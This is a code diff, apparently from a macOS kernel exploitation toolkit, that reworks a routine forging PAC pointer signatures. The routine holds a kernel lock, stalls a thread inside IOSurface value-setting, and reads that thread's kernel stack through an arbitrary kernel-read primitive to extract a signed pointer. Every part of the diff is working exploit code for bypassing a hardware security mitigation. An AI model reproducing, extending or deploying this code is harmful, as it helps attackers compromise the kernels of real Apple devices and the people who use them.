@@ -9,6 +9,7 @@
 #include <IOKit/IOKitLib.h>
 #include <IOSurface/IOSurface.h>
 
+#include "xnu/thread.h"
 #include "util/pacda.h"
 #include "util/ptrauth.h"
 #include "util/lck_rw.h"
@@ -18,6 +19,7 @@
 #include "slider/kernel.h"
 #include "util/assert.h"
 #include "util/log.h"
+#include "util/misc.h"
 
 #include "macos_params.h"
 
@@ -51,15 +53,16 @@ IOSurfaceRef xe_util_pacda_iosurface_create(void) {
 }
 
 void xe_util_pacda_io_surface_add_values(IOSurfaceRef surface, size_t idx_start, size_t count) {
+    CFMutableDictionaryRef dict = CFDictionaryCreateMutable(kCFAllocatorDefault, count, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
     for (size_t i=0; i<count; i++) {
         char name[NAME_MAX];
-        snprintf(name, sizeof(name), "xe_key_%lu", i + idx_start);
+        snprintf(name, sizeof(name), "key_%lu", i + idx_start);
         CFStringRef key = CFStringCreateWithCString(kCFAllocatorDefault, name, kCFStringEncodingUTF8);
-        CFNumberRef value = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &i);
-        IOSurfaceSetValue(surface, key, value);
+        CFDictionarySetValue(dict, key, kCFBooleanTrue);
         CFRelease(key);
-        CFRelease(value);
     }
+    IOSurfaceSetValues(surface, dict);
+    CFRelease(dict);
 }
 
 void xe_util_pacda_io_surface_destroy(IOSurfaceRef surface) {
@@ -95,26 +98,11 @@ uintptr_t xe_util_pacda_find_ptr(uintptr_t base, char* data, size_t data_size, u
     return 0;
 }
 
-int xe_util_pacda_find_target_thread(uintptr_t proc, uintptr_t* ptr_out) {
-    uintptr_t target_thread = 0;
-    int error = 0;
-    int tries = 10;
-    do {
-        error = xe_util_pacda_find_thread_with_state(proc, 0x1 | 0x8, &target_thread);
-        tries--;
-        sleep(1);
-    } while (error != 0 && tries > 0);
-    *ptr_out = target_thread;
-    return error;
-}
-
-
 uintptr_t xe_util_pacda_get_kstack_ptr(uintptr_t thread) {
     uintptr_t machine = thread + TYPE_THREAD_MEM_MACHINE_OFFSET;
     uintptr_t kstackptr = xe_kmem_read_uint64(machine, TYPE_MACHINE_THREAD_MEM_KSTACKPTR_OFFSET);
     return kstackptr;
 }
-
 
 int xe_util_pacda_sign(uintptr_t proc, uintptr_t ptr, uint64_t ctx, uintptr_t *out) {
     xe_log_debug("signing pointer %p with context %p", (void*)ptr, (void*)ctx);
@@ -133,19 +121,23 @@ int xe_util_pacda_sign(uintptr_t proc, uintptr_t ptr, uint64_t ctx, uintptr_t *o
     xe_util_pacda_io_surface_add_values(surface, 0, KALLOC_TO_KERNEL_MAP_SWITCH_LEN - 1);
     util_lck_rw = xe_util_lck_rw_lock_exclusive(proc, kalloc_map_lck);
     
+    uintptr_t* waiting_thread = alloca(sizeof(uintptr_t));
+    dispatch_semaphore_t sem_add_value_start = dispatch_semaphore_create(0);
     dispatch_semaphore_t sem_add_value_complete = dispatch_semaphore_create(0);
     dispatch_async(xe_dispatch_queue(), ^() {
+        *waiting_thread = xe_xnu_thread_current_thread();
+        dispatch_semaphore_signal(sem_add_value_start);
         xe_util_pacda_io_surface_add_values(surface, KALLOC_TO_KERNEL_MAP_SWITCH_LEN, 1);
         dispatch_semaphore_signal(sem_add_value_complete);
     });
     
-    uintptr_t target_thread = 0;
-    int error = xe_util_pacda_find_target_thread(proc, &target_thread);
-    if (error) {
-        goto exit;
-    }
+    dispatch_semaphore_wait(sem_add_value_start, DISPATCH_TIME_FOREVER);
+    dispatch_release(sem_add_value_start);
     
-    uintptr_t kstackptr = xe_util_pacda_get_kstack_ptr(target_thread);
+    int error = xe_util_lck_rw_wait_for_contention(util_lck_rw, *waiting_thread, 5000);
+    xe_assert_err(error);
+    
+    uintptr_t kstackptr = xe_util_pacda_get_kstack_ptr(*waiting_thread);
     if (kstackptr == 0) {
         error = EAGAIN;
         goto exit;
@@ -180,6 +172,7 @@ int xe_util_pacda_sign(uintptr_t proc, uintptr_t ptr, uint64_t ctx, uintptr_t *o
     
     xe_util_lck_rw_lock_done(&util_lck_rw);
     dispatch_semaphore_wait(sem_add_value_complete, DISPATCH_TIME_FOREVER);
+    dispatch_release(sem_add_value_complete);
     
     uintptr_t signed_ptr = xe_kmem_read_uint64(dict, TYPE_OS_DICTIONARY_MEM_DICT_ENTRY_OFFSET);
     
